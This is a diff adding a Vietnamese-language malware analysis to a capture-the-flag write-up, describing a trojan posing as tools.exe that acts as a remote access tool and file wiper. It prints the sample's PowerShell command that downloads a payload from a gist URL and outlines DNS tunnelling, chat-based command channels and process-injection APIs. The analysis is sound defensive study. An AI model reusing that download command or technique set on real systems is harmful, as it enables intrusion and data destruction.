@@ -427,16 +427,75 @@ Mình truy cập vào link git đó thì có được 1 chuỗi base45:
 
 **full flag: BKISC{Woah_I_r34lly_dunno_whut_t0_s4y_here_n0_idea_T^T}**
 
+---
 
+Nói thêm về con malware trên
 
+<img width="3759" height="1048" alt="image" src="https://github.com/user-attachments/assets/36a7dff7-213a-4911-8fd4-f0b6a517ae7e" />
 
+Đây là 1 con trojan giả dạng 1 file tools.exe thông thường, chức năng của nó là dùng để thực **remote access controll (RAT)**, nó thực hiện các hành động sau:
 
+- Đầu tiên thực hiện tải payload về bằng tiến trình powershell: `Powershell.exe -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-ObjectSystem.Net.WebClient).DownloadString('https://gist.githubusercontent.com/Amesame/76aecb869de8911eb65fb33458d8edfd/raw')"` - Lệnh này tải về 1 payload mà mình decode ra sẽ là flag part 2.
 
+- Nó thực hiện C2 server qua 2 web chat là: **hichat.com** và **yochat.com** —> các nền tảng chat được dùng làm kênh C2 (nhận lệnh/gửi dữ liệu)
+DNS Tunneling
+  - `nslookup + >nul 2>&1` — sử dụng nslookup để thực hiện DNS query, đây là kỹ thuật DNS tunneling dùng để:
+    - Exfiltrate dữ liệu qua DNS queries
+    - Nhận lệnh C2 qua DNS responses (thường dùng TXT records)
+    - Giấu kết quả (>nul 2>&1)
 
+- Sau đó thực hiện xóa tất cả các file với đuôi sau:
+<img width="1618" height="984" alt="image" src="https://github.com/user-attachments/assets/4b6f996a-c37e-4eb7-89c8-f83705168710" />
 
+ Từ KERNEL32.dll — Process Injection & Anti-Debug
 
+  ┌───────────────────────────────────────────────┬───────────────────────────────────────────────────────────────────────┐
+  │                      Hàm                      │                               Mục đích                                │
+  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
+  │ OpenProcess                                   │ Mở handle tới process khác                                            │
+  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
+  │ GetThreadContext / SetThreadContext           │ Process Injection — đọc/ghi context thread (có thể dùng để redirect   │
+  │                                               │ execution tới shellcode)                                              │
+  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
+  │ SuspendThread / ResumeThread                  │ Đình chỉ/khôi phục thread — dùng trong injection                      │
+  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
+  │ VirtualProtect                                │ Thay đổi quyền bộ nhớ (làm cho bộ nhớ có thể thực thi)                │
+  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
+  │ IsDebuggerPresent                             │ Anti-Debugging — kiểm tra xem có debugger đang gắn vào không          │
+  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
+  │ DeleteFileA                                   │ Xóa file                                                              │
+  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
+  │ GetProcAddress / GetModuleHandleA             │ Dynamic API resolution — phân giải API lúc runtime                    │
+  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
+  │ CreateEventA / CreateSemaphoreA /             │ Đồng bộ hóa thread                                                    │
+  │ WaitForMultipleObjects                        │                                                                       │
+  └───────────────────────────────────────────────┴───────────────────────────────────────────────────────────────────────┘
 
+ Từ CRT — Thực thi lệnh & File I/O
 
+  ┌──────────────────────────────────────────────────┬───────────────────────────────┐
+  │                       Hàm                        │           Mục đích            │
+  ├──────────────────────────────────────────────────┼───────────────────────────────┤
+  │ system()                                         │ Thực thi lệnh shell trực tiếp │
+  ├──────────────────────────────────────────────────┼───────────────────────────────┤
+  │ _popen() / _pclose()                             │ Thực thi lệnh và đọc output   │
+  ├──────────────────────────────────────────────────┼───────────────────────────────┤
+  │ _beginthreadex                                   │ Tạo thread mới                │
+  ├──────────────────────────────────────────────────┼───────────────────────────────┤
+  │ fopen / fwrite / fread / fclose / _write / _read │ Đọc/ghi file đầy đủ           │
+  ├──────────────────────────────────────────────────┼───────────────────────────────┤
+
+Kết luận: 
+
+ Loại malware: Đây là một **RAT (Remote Access Trojan)** kết hợp Wiper/Data Destroyer với các đặc điểm:
+
+  1. C2 đa kênh: GitHub Gist (tải payload), chat platforms (hichat/yochat), DNS tunneling (nslookup)
+  2. Process Injection: Có đủ primitive (SetThreadContext + SuspendThread + ResumeThread + VirtualProtect) để inject shellcode
+   vào process khác
+  3. Phá hoại dữ liệu: Duyệt và xóa file với 34 đuôi mở rộng trong Documents và Desktop
+  4. Anti-Debugging: IsDebuggerPresent để tránh bị phân tích
+  5. Thực thi lệnh: system() và _popen() cho phép chạy bất kỳ lệnh shell nào
+  6. Mã hóa Base32: Dùng để mã hóa dữ liệu (có thể dùng trong DNS tunneling hoặc mã hóa payload)
 
 
 
